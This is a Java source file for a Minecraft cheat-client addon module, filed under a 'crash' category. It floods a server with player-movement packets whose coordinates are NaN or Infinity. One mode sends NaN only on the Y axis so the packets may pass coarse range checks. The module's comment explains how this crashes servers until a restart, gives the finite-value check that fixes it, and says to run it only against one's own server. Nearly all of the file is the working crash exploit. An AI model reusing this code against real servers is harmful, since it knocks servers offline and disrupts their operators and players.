package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.EnumSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

/**
 * AUDIT: NaN Position (IEEE-754 special-value coordinate injection)
 *
 * Sends PlayerMoveC2SPacket.Full with NaN, +Infinity, or −Infinity in the
 * X/Y/Z fields. These are valid IEEE-754 double values that the Java deserialiser
 * will happily read, but they propagate catastrophically through arithmetic:
 *   NaN + anything = NaN   (poisons entity position forever)
 *   Infinity * 0 = NaN
 *   Infinity < bound = false (bypasses range checks that use </>)
 *
 * A server that stores a NaN position can then crash on every subsequent
 * distance/bounds calculation involving that player until a restart.
 *
 * The NAN_Y_ONLY mode sends real X/Z with NaN Y — a subtler probe that may
 * pass coarse XZ-range checks while still poisoning the Y axis.
 *
 * Patch signal: validate all incoming coordinates are finite
 * (Double.isFinite(x) && Double.isFinite(y) && Double.isFinite(z)) at the
 * very first line of the movement handler; reject and do not propagate NaN or
 * Infinity to any world state or calculation.
 *
 * Run against your OWN local server only.
 */
public class NanPosition extends Module {
    public enum CoordMode { NAN, POSITIVE_INFINITY, NEGATIVE_INFINITY, NAN_Y_ONLY }

    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<CoordMode> mode = sgGeneral.add(new EnumSetting.Builder<CoordMode>()
        .name("mode").description("Which IEEE-754 special value to inject.")
        .defaultValue(CoordMode.NAN).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;
    private boolean kicked = false;

    public NanPosition() {
        super(AddonTemplate.CRASH_CATEGORY, "nan-position",
            "Sends NaN/Infinity coordinates. Tests server IEEE-754 coordinate sanitisation.");
    }

    @Override
    public void onActivate() { ticksActive = 0; packetsSent = 0; kicked = false; }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        double val = switch (mode.get()) {
            case NAN               -> Double.NaN;
            case POSITIVE_INFINITY -> Double.POSITIVE_INFINITY;
            case NEGATIVE_INFINITY -> Double.NEGATIVE_INFINITY;
            case NAN_Y_ONLY        -> Double.NaN;
        };
        double px = mc.player.getX(), pz = mc.player.getZ();
        double sx = (mode.get() == CoordMode.NAN_Y_ONLY) ? px : val;
        double sy = val;
        double sz = (mode.get() == CoordMode.NAN_Y_ONLY) ? pz : val;
        mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(
            sx, sy, sz, mc.player.getYaw(1.0F), mc.player.getPitch(1.0F), false, false));
            packetsSent++;
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            info("  Server kicked: %s", kicked ? "YES — rejection detected" : "no kick observed");
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        kicked = true;
        if (autoDisable.get() && isActive()) toggle();
    }
}
